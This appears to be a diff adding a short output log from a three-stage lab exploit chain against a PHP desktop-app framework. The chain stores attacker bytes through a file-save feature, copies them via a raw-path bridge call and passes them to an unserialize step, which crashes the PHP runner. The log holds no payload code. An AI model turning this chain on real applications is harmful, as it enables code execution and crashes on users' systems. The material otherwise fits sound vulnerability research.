@@ -1,0 +1,13 @@
+=== stage 1: persist attacker bytes (app file-save feature) ===
+200 {"success":true,"path":"\/mnt\/c\/Users\/andre\/Downloads\/php2shell-claude\/nativephp_lane\/lab\/storage\/app\/uploads\/user-content.bin","bytes":10142}
+
+=== stage 2: File.Copy raw-path (framework bridge hole) ===
+200 {"status":"success","data":{"success":true}}
+
+=== stage 3: AsyncTask.Dispatch -> runner lane unserialize ===
+runner_exit = 139
+runner_bin = /tmp/php8512_build/plain2/sapi/cli/php
+runner_alloc = 0
+--- runner output ---
+payload_len=10142
+Segmentation fault (core dumped)
